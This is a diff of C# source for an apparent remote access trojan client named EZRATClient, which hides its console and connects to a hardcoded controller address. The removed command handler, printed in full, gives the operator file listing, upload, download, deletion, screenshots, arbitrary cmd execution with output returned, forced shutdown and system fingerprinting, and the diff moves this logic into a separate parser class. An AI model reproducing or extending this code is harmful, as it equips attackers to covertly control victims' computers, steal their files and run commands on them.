@@ -1,27 +1,19 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Linq;
 using System.Text;
-using System.Threading.Tasks;
 using System.Runtime.InteropServices;
 using System.Net;
 using System.IO;
 using System.Net.Sockets;
 using System.Threading;
 using System.Security.Cryptography;
-using EZRATClient.Utils;
 using EZRATClient.Forms;
 using System.Diagnostics;
-using System.Drawing.Imaging;
-using System.Windows.Forms;
 
 namespace EZRATClient
 {
     public class Program
     {
-
-
-
         [DllImport("kernel32.dll")]
         static extern IntPtr GetConsoleWindow();
 
@@ -34,7 +26,7 @@ namespace EZRATClient
 
         static string _ip = "192.168.1.112";
         static int _port = 1234;
-        static string _version = "0.1.0.1";
+        public static string _version = "0.1.0.1";
 
         public static string Ip { get => _ip; set => _ip = value; }
         public static int Port { get => _port; set => _port = value; }
@@ -42,7 +34,7 @@ namespace EZRATClient
         private static TcpClient client = new TcpClient();
         private static bool connectedBefore = false;
         private static Thread TConnect;
-        private static Socket _clientSocket = new Socket
+        public static Socket _clientSocket = new Socket
             (AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 
         private static bool _isDiconnect;
@@ -55,9 +47,9 @@ namespace EZRATClient
             set { _isDiconnect = value; }
         }
 
-        private static Chat cht = null;
+        
 
-        private static Thread TChat;
+        
 
 
         #region Variables
@@ -195,251 +187,9 @@ namespace EZRATClient
 
         private static void HandleCommand(string text)
         {
-            if (text.StartsWith("getinfo-"))// i added this to start task manager
-            {
-
-                string response = "infoback;";
-                response += text.Substring(8);
-                response += ";";
-                response += SystemInfo.GetLocalIPAddress();
-                response += "¦";
-                response += SystemInfo.GetMachineName();
-                response += "¦";
-                response += SystemInfo.GetUserName();
-                response += "¦";
-                response += SystemInfo.GetWindowsVersion();
-                response += "¦";
-                response += _version;
-
-                SendCommand(response);
-
-            }
-            else if (text == "dc") { _clientSocket.Shutdown(SocketShutdown.Both); _clientSocket.Close(); ConnectToServer(); }
-            else if (text == "lsdrives")
-            {
-                string response = "lsdrives;";
-                string[] drives = SystemInfo.GetDrives();
-                for (int i = 0; i < drives.Length; i += 1)
-                {
-                    response += drives[i];
-                    response += "¦";
-                }
-
-                SendCommand(response);
-            }
-            else if (text.StartsWith("lsfiles-"))
-            {
-                string path = text.Substring(8);
-                DirectoryInfo d = new DirectoryInfo(path);
-                List<DirectoryInfo> resD = new List<DirectoryInfo>();
-                List<FileInfo> resF = new List<FileInfo>();
-
-                try
-                {
-                    resD = d.EnumerateDirectories("*", SearchOption.TopDirectoryOnly)
-             .Where(fi => (fi.Attributes & FileAttributes.Normal) == 0).ToList();
-
-                    resF = d.EnumerateFiles("*", SearchOption.TopDirectoryOnly)
-                 .Where(fi => (fi.Attributes & FileAttributes.Normal) == 0).ToList();
-                }
-                catch (Exception ex)
-                {
-                    Console.WriteLine(ex.Message);
-                }
-
-
-                string response = "lsfiles;";
-                response += path;
-                response += ";";
-                resD.ForEach((item) =>
-                {
-                    response += item.Name; // Tarte.cs
-                    response += "¦";  // Tarte.cs¦
-                    response += "2";  // Tarte.cs¦2
-                    response += "|";  // Tarte.cs¦2|
-                });
-                resF.ForEach((item) =>
-                {
-                    response += item.Name; // Tarte.cs
-                    response += "¦";  // Tarte.cs¦
-                    response += "1";  // Tarte.cs¦1
-                    response += "|";  // Tarte.cs¦1|
-                });
-
-                SendCommand(response);
-            }
-            else if (text.StartsWith("chat;"))
-            {
-                string options = text.Substring(5);
-                string[] tmp = options.Split(';');
-                string msg;
-
-                msg = tmp[0];
-                if (cht == null)
-                {
-                    cht = new Chat(msg);
-                    TChat = new Thread(() => cht.ShowDialog());
-                    TChat.Start();
-                }
-                else
-                {
-                    cht.NewMessage(msg);
-                }
-
-
-            }
-            else if (text.StartsWith("chatdata;"))
-            {
-                if (cht != null)
-                {
-                    SendCommand("chatdata;" + String.Join("¦", cht.Texted));
-                }
-            }
-            else if (text.StartsWith("dlfile;"))
-            {
-                string path = text.Substring(7);
-                SendFile(path);
-
-            }
-            else if (text.StartsWith("upfile;"))
-            {
-                text = text.Substring(7);
-                string[] lines = text.Split(';');
-                string path = lines[0];
-                byte[] recFile = Encoding.Default.GetBytes(lines[1]);
-                ReceiveFile(recFile, path);
-            }
-            else if (text.StartsWith("dtfile;"))
-            {
-                text = text.Substring(7);
-                File.Delete(text);
-            }
-            else if (text.StartsWith("rmfile;"))
-            {
-                text = text.Substring(7);
-                string[] lines = text.Split(';');
-                string src = lines[0];
-                string dst = lines[1];
-                File.Move(src, dst);
-            }
-            else if (text.StartsWith("procview;"))
-            {
-                Process[] proc = Process.GetProcesses();
-                string result = "procview;";
-                for (int i = 0; i < proc.Length; i++)
-                {
-                    result += $"{proc[i].ProcessName}¦{proc[i].Id};";
-                }
-                SendCommand(result);
-            }
-            else if (text == "scrnshot;")
-            {
-                using (MemoryStream ms = new MemoryStream())
-                {
-                    ScreenUtils.ScreenShot().Save(ms, ImageFormat.Png);
-                    string result = "scrnshot;" + Encoding.Default.GetString(ms.ToArray());
-                    SendCommand(result);
-                }
-            }
-            else if (text.StartsWith("cmd;"))
-            {
-                text = text.Substring(4);
-                string[] lines = text.Split(';');
-                ExecuteCommand(lines[1], lines[0]);
-            }
-            else if (text.StartsWith("control;"))
-            {
-                text = text.Substring(8);
-                switch (text)
-                {
-                    case "0":
-                        WindowsControl("shutdown /l");
-                        break;
-                    case "1":
-                        WindowsControl("shutdown /r /t 00");
-                        break;
-                    case "2":
-                        WindowsControl("shutdown /s /f /p /t 00");
-                        break;
-                    default:
-                        break;
-                }
-            } else if(text == "sysinfo;")
-            {
-                string result = "sysinfo;";
-                result += SystemInfoDetails.GetBiosIdentifier();
-                result += "¦";
-                result += SystemInfoDetails.GetCpuName();
-                result += "¦";
-                result += SystemInfoDetails.GetGpuName();
-                result += "¦";
-                result += SystemInfoDetails.GetLanIp();
-                result += "¦";
-                result += SystemInfoDetails.GetMacAddress();
-                result += "¦";
-                result += SystemInfoDetails.GetMainboardIdentifier();
-                result += "¦";
-                result += SystemInfoDetails.GetTotalRamAmount();
-                SendCommand(result);
-            }
-            else if (text.StartsWith("msgbox;"))
-            {
-                string options = text.Substring(7);
-                string[] tmp = options.Split(';');
-                string title = tmp[0];
-                string value = tmp[1];
-                int icon = Convert.ToInt32(tmp[2]);
-                MessageBoxIcon i;
-                switch (icon)
-                {
-                    case 0:
-                        i = MessageBoxIcon.Information;
-                        break;
-                    case 1:
-                        i = MessageBoxIcon.Error;
-                        break;
-                    case 2:
-                        i = MessageBoxIcon.Question;
-                        break;
-                    default:
-                        i = MessageBoxIcon.Information;
-                        break;
-                }
-                MessageBox.Show(value,title,MessageBoxButtons.OK,i);
-            }
+            CommandParser.ParserAndExecute(text);
+            
         }
-
-        private static void WindowsControl(string command)
-        {
-            ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/C " + command);
-            procStartInfo.RedirectStandardOutput = false;
-            procStartInfo.UseShellExecute = false;
-            procStartInfo.CreateNoWindow = true;
-            System.Diagnostics.Process proc = new System.Diagnostics.Process();
-            proc.StartInfo = procStartInfo;
-            proc.Start();
-        }
-        private static void ExecuteCommand(string command, string path = "C:\\")
-        {
-            ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/C " + command);
-
-            procStartInfo.RedirectStandardOutput = true;
-            procStartInfo.UseShellExecute = false;
-            procStartInfo.CreateNoWindow = true;
-            procStartInfo.WorkingDirectory = path;
-            System.Diagnostics.Process proc = new System.Diagnostics.Process();
-            proc.StartInfo = procStartInfo;
-            proc.Start();
-            string result = proc.StandardOutput.ReadToEnd();
-            SendCommand("cmd;" + path + ";" + result);
-        }
-        private static void ReceiveFile(byte[] data, string path)
-        {
-            File.WriteAllBytes(path, data);
-        }
-
-
-
 
 
         private static string[] GetCommands(string rawData)
@@ -494,7 +244,7 @@ namespace EZRATClient
                         }
 
                         Array.Clear(recvFile, 0, recvFile.Length);
-                        SendCommand("frecv");
+                        Program.SendCommand("frecv");
                         writeSize = 0;
                         isFileDownload = false;
                     }
@@ -520,27 +270,7 @@ namespace EZRATClient
             }
         }
 
-        public static void SendFile(string path)
-        {
-            if (!_clientSocket.Connected) //If the client isn't connected
-            {
-                Console.WriteLine("Socket is not connected!");
-                return; //Return
-            }
-
-
-            try
-            {
-                //_clientSocket.SendFile(path); //Send the data to the server
-                byte[] result = Encoding.Default.GetBytes(Encrypt("dlfile;" + File.ReadAllText(path)));
-                _clientSocket.Send(result);
-            }
-            catch (Exception ex) //Failed to send data to the server
-            {
-                Console.WriteLine("Send File Failure " + ex.Message);
-                return; //Return
-            }
-        }
+        
         public static void SendCommand(string response)
         {
             if (!_clientSocket.Connected) //If the client isn't connected
@@ -564,7 +294,7 @@ namespace EZRATClient
         }
 
 
-        private static void ConnectToServer()
+        public static void ConnectToServer()
         {
             int attempts = 0; //Connection attempts to the server
 
